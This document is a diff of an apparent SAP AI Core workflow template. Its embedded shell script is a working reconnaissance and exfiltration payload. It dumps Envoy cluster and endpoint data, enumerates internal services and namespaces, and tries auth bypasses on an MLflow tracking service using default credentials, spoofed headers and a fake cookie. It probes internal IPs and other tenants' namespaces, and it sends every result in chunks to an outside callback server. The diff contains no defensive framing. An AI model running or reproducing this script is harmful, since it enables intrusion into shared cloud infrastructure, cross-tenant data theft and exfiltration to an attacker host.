@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "5.0.0"
+    ai.sap.com/version: "5.0.1"
 spec:
   entrypoint: main
   templates:
@@ -25,117 +25,66 @@ spec:
       - -c
       - |
         CB="https://www.masonhck.tech/cb.php"
-        post() { curl -k -s -X POST "$CB?src=$1" --max-time 5 -d @- ; }
-        get() { curl -k -s "$CB?src=$1" --max-time 5 ; }
+        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 5 -d @- ; }
+        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
 
         get "recon5-start-$(hostname)"
 
-        # === 1. FULL cluster names dump (unique service names only) ===
-        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | \
-          grep -oE 'outbound\|[0-9]+\|[^|]*\|[^ ;:]+' | sort -u > /tmp/cnames.txt
-        wc -l /tmp/cnames.txt | post "recon5-cnames-count"
-        # Send in 700-byte chunks
-        split -b 700 /tmp/cnames.txt /tmp/cn_
-        i=0; for f in /tmp/cn_*; do cat "$f" | post "recon5-cnames-${i}"; i=$((i+1)); done
+        # 1. Full unique cluster service names
+        curl -k -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9][-a-z0-9]*\.[a-z0-9][-a-z0-9]*\.svc\.cluster\.local' | sort -u > /tmp/svcs.txt
+        wc -l /tmp/svcs.txt | post "recon5-svc-count"
+        head -c 700 /tmp/svcs.txt | post "recon5-svcs-1"
+        tail -c +701 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-2"
+        tail -c +1401 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-3"
+        tail -c +2101 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-4"
 
-        # === 2. Extract unique namespace names from cluster data ===
-        cat /tmp/cnames.txt | grep -oE '[a-z0-9-]+\.svc\.cluster\.local' | \
-          sed 's/\.svc\.cluster\.local//' | sort -u | post "recon5-namespaces"
+        # 2. Extract unique namespaces
+        cat /tmp/svcs.txt | awk -F. '{print $2}' | sort -u | post "recon5-namespaces"
 
-        # === 3. OTel collector - deep exploration ===
-        OTEL="http://100.109.206.82:13133"
-        curl -k -s --connect-timeout 3 "${OTEL}/debug/pipelinez" 2>&1 | head -c 700 | post "recon5-otel-pipes"
-        curl -k -s --connect-timeout 3 "${OTEL}/debug/extensionz" 2>&1 | head -c 700 | post "recon5-otel-ext"
-        curl -k -s --connect-timeout 3 "${OTEL}/debug/servicez" 2>&1 | head -c 700 | post "recon5-otel-svc"
+        # 3. Cluster endpoints via JSON format
+        curl -k -s "http://127.0.0.1:15000/clusters?format=json" > /tmp/clust.json
+        wc -c /tmp/clust.json | post "recon5-clust-size"
+        # Extract just name->ip:port pairs using grep/sed
+        grep -oE '"name":"[^"]+"|"address":"[^"]+"|"port_value":[0-9]+' /tmp/clust.json | head -c 2000 | post "recon5-endpoints-1"
+        grep -oE '"name":"[^"]+"|"address":"[^"]+"|"port_value":[0-9]+' /tmp/clust.json | tail -c +2001 | head -c 2000 | post "recon5-endpoints-2"
 
-        # === 4. SAP Connectivity Service - try various tokens/headers ===
-        CONN="http://100.104.7.43:20003"
-        # Try with our JWT as connectivity token
-        curl -k -s --connect-timeout 3 "${CONN}/" \
-          -H "SAP-CP-Connectivity-Service-Token: ${AICORE_TRACKING_TOKEN:-test}" 2>&1 | head -c 700 | post "recon5-conn-test"
-        # Try empty token
-        curl -k -s --connect-timeout 3 "${CONN}/" \
-          -H "SAP-CP-Connectivity-Service-Token: " 2>&1 | head -c 700 | post "recon5-conn-empty"
-        # Try common paths
-        curl -k -s --connect-timeout 3 "${CONN}/api/v1/connectivity" 2>&1 | head -c 700 | post "recon5-conn-api"
-        curl -k -s --connect-timeout 3 "${CONN}/healthz" 2>&1 | head -c 700 | post "recon5-conn-health"
-
-        # === 5. 8888 services - path enumeration ===
-        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
-          for path in /healthz /health /api /v1 /v2 /metrics /debug /status /info /swagger /api/v1 /config /.well-known/openid-configuration; do
-            result=$(curl -k -s --connect-timeout 2 "http://${ip}:8888${path}" 2>&1)
-            if [ -n "$result" ] && ! echo "$result" | grep -q "404 page not found"; then
-              echo "${ip}:8888${path} => ${result}" | head -c 500 | post "recon5-8888-${ip}-$(echo $path | tr '/' '_')"
-            fi
-          done
-        done
-
-        # === 6. Tracking service auth discovery ===
+        # 4. MLflow tracking - auth bypass attempts
         TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
-        # Try different header names
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "X-Token: test" 2>&1 | head -c 700 | post "recon5-track-xtoken"
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "AI-Auth-Token: test" 2>&1 | head -c 700 | post "recon5-track-aiauth"
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "X-AI-Token: test" 2>&1 | head -c 700 | post "recon5-track-xai"
-        # Check if basic auth works
-        curl -k -s --connect-timeout 3 -u "admin:admin" "${TRACK}/api/2.0/mlflow/experiments/list" 2>&1 | head -c 700 | post "recon5-track-basic"
-        # Check if no-auth paths exist
-        curl -k -s --connect-timeout 3 "${TRACK}/health" 2>&1 | head -c 700 | post "recon5-track-health2"
-        curl -k -s --connect-timeout 3 "${TRACK}/" 2>&1 | head -c 700 | post "recon5-track-root2"
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/" 2>&1 | head -c 700 | post "recon5-track-api-root"
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Authorization: Basic YWRtaW46YWRtaW4=" | head -c 700 | post "recon5-track-basic64"
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "X-Internal: true" | head -c 700 | post "recon5-track-xinternal"
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Cookie: session=admin" | head -c 700 | post "recon5-track-cookie"
 
-        # === 7. Try Envoy admin to modify routing (CRITICAL) ===
-        # POST to /clusters to get stats with actual endpoint IPs
-        curl -k -s "http://127.0.0.1:15000/clusters?format=json" 2>&1 | \
-          python3 -c "
-import sys,json
-try:
-    d=json.load(sys.stdin)
-    for cs in d.get('cluster_statuses',[])[:50]:
-        name=cs.get('name','')
-        hosts=cs.get('host_statuses',[])
-        for h in hosts:
-            addr=h.get('address',{}).get('socket_address',{})
-            ip=addr.get('address','')
-            port=addr.get('port_value','')
-            if ip: print(f'{name} -> {ip}:{port}')
-except: pass
-" 2>&1 | head -c 2000 | post "recon5-cluster-endpoints-1"
+        # 5. SAP Connectivity Service exploration
+        CONN="http://100.104.7.43:20003"
+        curl -k -s --connect-timeout 3 "${CONN}/" -H "SAP-CP-Connectivity-Service-Token: test" | head -c 700 | post "recon5-conn-tok"
+        curl -k -s --connect-timeout 3 "${CONN}/healthz" | head -c 700 | post "recon5-conn-hz"
+        curl -k -s --connect-timeout 3 "${CONN}/" -v 2>&1 | head -c 700 | post "recon5-conn-verbose"
 
-        curl -k -s "http://127.0.0.1:15000/clusters?format=json" 2>&1 | \
-          python3 -c "
-import sys,json
-try:
-    d=json.load(sys.stdin)
-    for cs in d.get('cluster_statuses',[])[50:100]:
-        name=cs.get('name','')
-        hosts=cs.get('host_statuses',[])
-        for h in hosts:
-            addr=h.get('address',{}).get('socket_address',{})
-            ip=addr.get('address','')
-            port=addr.get('port_value','')
-            if ip: print(f'{name} -> {ip}:{port}')
-except: pass
-" 2>&1 | head -c 2000 | post "recon5-cluster-endpoints-2"
-
-        # === 8. Try to access other resource group namespaces directly ===
-        # Our namespace is rg-3ba0e0a4-cd927cab
-        # Try common patterns for other BB tenants
-        for ns in rg-3ba0e0a4 rg-default default ml-tracking ml-serving ai-core; do
-          nslookup -timeout=2 "${ns}.svc.cluster.local" 2>&1 | head -c 200 | post "recon5-ns-${ns}"
+        # 6. Probe ALL services found in Envoy mesh
+        for svc in $(cat /tmp/svcs.txt | head -30); do
+          result=$(curl -k -s --connect-timeout 2 "http://${svc}/" 2>&1 | head -c 200)
+          if [ -n "$result" ]; then
+            echo "${svc}: ${result}" | post "recon5-probe-$(echo $svc | cut -d. -f1)"
+          fi
         done
 
-        # Try to resolve specific services in other BB tenant namespaces
-        # BB-13 and BB-15 are other tenants we know about
-        for prefix in rg-3ba0e0a3 rg-3ba0e0a5 rg-3ba0e0a2 rg-3ba0e0a1; do
-          for suf in $(echo abcdef0123456789 | fold -w1); do
-            result=$(nslookup -timeout=1 "anything.${prefix}-${suf}.svc.cluster.local" 2>&1)
-            if ! echo "$result" | grep -q "NXDOMAIN\|SERVFAIL\|timed out"; then
-              echo "${prefix}-${suf}: ${result}" | post "recon5-tenant-${prefix}-${suf}"
+        # 7. Services on port 8888 with more paths
+        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
+          for path in /healthz /metrics /debug/pprof /api/v1/status /ready; do
+            r=$(curl -k -s --connect-timeout 2 "http://${ip}:8888${path}" 2>&1)
+            if [ -n "$r" ] && ! echo "$r" | grep -q "404 page not found"; then
+              echo "${ip}:8888${path}: ${r}" | head -c 400 | post "recon5-p8888"
             fi
           done
+        done
+
+        # 8. OTel collector deeper
+        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/tracez" | head -c 700 | post "recon5-otel-traces"
+        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/rpcz" | head -c 700 | post "recon5-otel-rpc"
+
+        # 9. Try directly accessing other rg namespaces via DNS
+        for ns in ml-tracking ml-serving ai-core istio-system kube-system dynatrace opentelemetry; do
+          nslookup "${ns}.svc.cluster.local" 2>&1 | head -c 200 | post "recon5-dns-${ns}"
         done
 
         get "recon5-done-$(hostname)"
